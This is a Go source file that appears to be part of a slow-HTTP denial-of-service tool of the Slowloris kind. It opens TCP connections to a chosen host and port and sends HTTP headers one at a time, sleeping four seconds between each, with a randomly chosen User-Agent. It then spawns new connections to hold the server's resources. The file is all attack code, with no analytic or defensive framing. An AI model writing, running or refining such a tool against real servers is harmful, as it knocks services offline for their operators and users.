package main

import (
	"net"
	"os"
	"fmt"
	"io/ioutil"
	"time"
	"strings"
)

func keepAlive(conn *net.TCPConn, info string) {
	fmt.Println("Sending header: " + strings.Split(info, ": ")[0])
	_, err := conn.Write([]byte(info))
	checkNetError(conn, err)
	time.Sleep(time.Second * 4)
}

func OpenSocket(addr string, port string) {
	combinedAddr := addr + ":" + port
	tcpAddr, err := net.ResolveTCPAddr("tcp4", combinedAddr)
	checkError(err)
	conn, err := net.DialTCP("tcp", nil, tcpAddr)
	checkNetError(conn, err)
	conn.SetKeepAlive(true)
	for i := 0; i < len(headers); i++ {
		keepAlive(conn, headers[i])
	}
	userAgent := "User-Agent: " + userAgents[random(0, 25)]
	keepAlive(conn, userAgent)
	host := "Host: " + addr + "\r\n\r\n"
	keepAlive(conn, host)
	_, err = ioutil.ReadAll(conn)
	checkError(err)
	conn.Close()
    fmt.Println("Spawning new connection...")
    //os.Exit(0)
}

func checkNetError(conn *net.TCPConn, err error) {
    if err != nil {
		fmt.Fprintf(os.Stderr, "Fatal error: %s", err.Error())
		conn.Close()
        // os.Exit(1)
    }
}

func checkError(err error) {
    if err != nil {
		fmt.Fprintf(os.Stderr, "Fatal error: %s", err.Error())
        os.Exit(1)
    }
}